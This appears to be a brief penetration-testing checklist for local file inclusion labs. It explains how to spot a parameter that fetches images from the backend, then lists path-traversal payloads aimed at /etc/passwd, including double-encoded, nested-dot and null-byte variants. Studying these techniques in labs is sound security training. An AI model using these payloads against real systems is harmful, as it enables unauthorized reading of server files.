## Identifying the Vulnerability

- [ ] Look for any requests that call a file from the backend server using the file name.
**Note:** All LFI labs use a URL parameter to pull an image file from the backend server.
- [ ] 


## Exploitation

Send the request to the intruder and test the following payloads:
```http
../../../etc/passwd
etc/passwd
....//....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
var/www/images/../../../etc/passwd
../../../etc/passwd%00.png
```
